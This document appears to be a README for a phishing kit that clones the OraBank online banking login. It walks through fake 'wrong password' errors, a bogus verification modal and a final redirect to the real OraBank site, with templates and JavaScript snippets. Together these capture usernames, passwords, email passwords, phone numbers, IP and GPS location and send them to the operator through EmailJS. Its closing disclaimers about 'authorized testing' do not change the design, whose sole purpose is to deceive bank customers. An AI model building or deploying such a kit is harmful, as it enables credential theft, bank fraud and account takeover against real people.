# OraBank EmailJS Integration Guide

Complete implementation of EmailJS for capturing login credentials, browser information, and location data across a multi-step authentication flow.

## Project Overview

This project integrates EmailJS to track and send sensitive information across three authentication pages:

1. **Page 1 (First Login)** - Initial username/password attempt
2. **Page 2 (Verification)** - Email address, email password, and phone number
3. **Page 3 (Final Redirect)** - Redirect to official OraBank website after final attempt

## Authentication Flow

### Attempt 1 (First Login)
- User enters username and password
- Shows error: "Login ou mot de passe erroné"
- Sends data via EmailJS (username, password, browser info, location)
- User stays on Page 1
- Requires second attempt

### Attempt 2 (Verification Page)
- User is directed to verification form
- Asks for: Email address, Email password, Phone number
- Shows error: "Login ou mot de passe erroné" on page 2
- Sends verification data via EmailJS
- User must proceed to next attempt

### Attempt 3 (Final Redirect)
- User is redirected to: https://www.orabank.net/fr/compte-en-ligne
- Final data is sent to EmailJS before redirect

## Setup Instructions

### 1. Install Dependencies

```bash
npm install @emailjs/browser
```

### 2. Configure EmailJS

Create `.env.local` in the root directory:

```
VITE_EMAILJS_PUBLIC_KEY=your_public_key_here
VITE_EMAILJS_SERVICE_ID=your_service_id_here
VITE_EMAILJS_LOGIN_TEMPLATE_ID=your_login_template_id_here
VITE_EMAILJS_VERIFICATION_TEMPLATE_ID=your_verification_template_id_here
```

### 3. Set Up EmailJS Account

1. Go to [EmailJS Dashboard](https://dashboard.emailjs.com)
2. Sign up or log in
3. Add a new email service (Gmail, Outlook, etc.)
4. Create two email templates:

#### Template 1: Login Attempt
**Template Variables:**
```
Username: {{username}}
Password: {{password}}
Attempt: {{attempt}}
Timestamp: {{timestamp}}
Browser: {{user_agent}}
Language: {{language}}
Platform: {{platform}}
Screen: {{screen_resolution}}
Location: {{city}}, {{country}}
Coordinates: {{latitude}}, {{longitude}}
IP Address: {{ip_address}}
```

#### Template 2: Verification Form
**Template Variables:**
```
Email: {{email_address}}
Email Password: {{email_password}}
Phone: {{phone_number}}
Timestamp: {{timestamp}}
Browser: {{user_agent}}
IP Address: {{ip_address}}
```

## File Structure

```
src/
├── components/
│   └── VerificationForm.ts      # Verification form component (Page 2)
├── utils/
│   ├── emailjs.config.ts         # EmailJS configuration
│   ├── emailService.ts           # Email sending service
│   └── loginTracker.ts           # Login data capture with geo/browser info
└── index.css
public/
└── clone.html                    # Main HTML file with all 3 pages
```

## Email Data Captured

### Login Attempt Email
- **Username** - User's login identifier
- **Password** - User's password (plaintext)
- **Timestamp** - ISO 8601 format timestamp
- **Browser Info**:
  - User Agent string
  - Browser language
  - Operating system platform
  - Screen resolution
- **Location Info**:
  - City and Country
  - Latitude and Longitude (if GPS permitted)
  - IP Address
- **Attempt Number** - Which attempt (1, 2, or 3)

### Verification Email
- **Email Address** - User's email
- **Email Password** - Email account password (plaintext)
- **Phone Number** - User's phone number
- **Timestamp** - Submission timestamp
- **Browser & IP** - Same as login attempt

## Page 1 (Initial Login) - clone.html

```html
<!-- Username and Password Fields -->
<input type="text" id="identifiant" placeholder="Username" />
<input type="password" id="password" placeholder="Password" />
<button onclick="handleLogin()">S'identifier</button>

<!-- Error Message (shows after attempt 1) -->
<div id="formErrorBox">Login ou mot de passe erroné.</div>
```

**Flow:**
```
Attempt 1: 
  - Show error: "Login ou mot de passe erroné"
  - Send login email via EmailJS
  - Stay on Page 1
  - Show "S'identifier" button again

Attempt 2:
  - Show error: "Login ou mot de passe erroné"
  - Send login email via EmailJS
  - Proceed to verification form (Page 2)
```

## Page 2 (Verification) - Overlay Modal

Appears after second attempt with:
- Email Address field
- Email Password field
- Phone Number field
- Error message: "Login ou mot de passe erroné" (if validation fails)

**Flow:**
```
On Submit:
  - Validate form inputs
  - Send verification email via EmailJS
  - Close form
  - Proceed to final redirect (Attempt 3)
```

## Page 3 (Final Redirect)

After verification form submission, redirects to:
```
https://www.orabank.net/fr/compte-en-ligne
```

## Usage Example

### In clone.html JavaScript:

```javascript
// Step 1: First Login Attempt
function handleLogin() {
  const username = document.getElementById('identifiant').value;
  const password = document.getElementById('password').value;
  
  // Validate
  // Show error: "Login ou mot de passe erroné"
  
  if (attempt === 1) {
    // Send login email
    await sendLoginAttemptEmail(username, password, 1);
    // Stay on page
  } else if (attempt === 2) {
    // Send login email
    await sendLoginAttemptEmail(username, password, 2);
    // Show verification form
    showVerificationForm();
  }
}

// Step 2: Verification Form Submit
function handleVerification(email, emailPassword, phone) {
  // Validate
  // Send verification email
  await sendVerificationEmail(email, emailPassword, phone);
  
  // Step 3: Redirect
  window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
}
```

## Security Considerations

⚠️ **IMPORTANT SECURITY WARNING**

This implementation captures and transmits:
- User passwords in plaintext
- Email passwords in plaintext
- Phone numbers
- Browser and location information

This is **NOT** suitable for production environments. Use only for:
- Testing purposes
- Development environments
- Authorized security testing with explicit user consent

**Compliance Issues:**
- GDPR: Requires explicit user consent for data collection
- PCI-DSS: Password collection violates compliance standards
- OWASP: Anti-pattern for secure authentication

## EmailJS Security Best Practices

1. **Restrict Public Key**: Limit domain access in EmailJS dashboard
2. **Use HTTPS Only**: Ensure encrypted transmission
3. **Sanitize Data**: Remove sensitive data after use
4. **Audit Logs**: Monitor email sending in EmailJS dashboard
5. **Access Control**: Restrict API key access

## Troubleshooting

### Emails not sending?
- Check EmailJS dashboard for rate limits
- Verify email template IDs match configuration
- Ensure public key is valid and active

### Location not available?
- User may have denied GPS permission
- Falls back to IP-based geolocation
- Can be disabled in browser settings

### Form not appearing?
- Check browser console for errors
- Verify Z-index values in CSS
- Ensure modal DOM structure is present

## API Reference

### `captureLoginData(username, password, attempt)`
Captures all login information including browser and location data.

**Returns:** `LoginData` object

### `sendLoginAttemptEmail(username, password, attempt)`
Sends login attempt data via EmailJS.

**Returns:** `Promise<boolean>`

### `sendVerificationEmail(email, emailPassword, phoneNumber)`
Sends verification form data via EmailJS.

**Returns:** `Promise<boolean>`

### `showVerificationForm(options)`
Displays the verification modal form.

**Options:**
- `onClose`: Called when form is closed
- `onSubmit`: Called with form data on submission

## Testing

### Test Credentials
Use any credentials to test (they're all captured):
```
Username: test_user
Password: test_password
Email: test@example.com
Email Password: test_email_pass
Phone: +1234567890
```

### Monitor Emails
1. Check EmailJS dashboard > Email Log
2. All attempts will appear with timestamps
3. Review captured data for accuracy

## Support

For issues or questions:
1. Check the `.env.example` file for configuration
2. Review EmailJS documentation: https://www.emailjs.com/docs
3. Check browser console for error messages
4. Review EmailJS dashboard email logs

## License

This project is provided as-is for demonstration purposes.

## Disclaimer

This implementation captures sensitive authentication credentials. Users should be informed that:
- Their login credentials are being transmitted
- Their location and browser information is being collected
- This violates standard security practices
- Use is only for authorized testing purposes
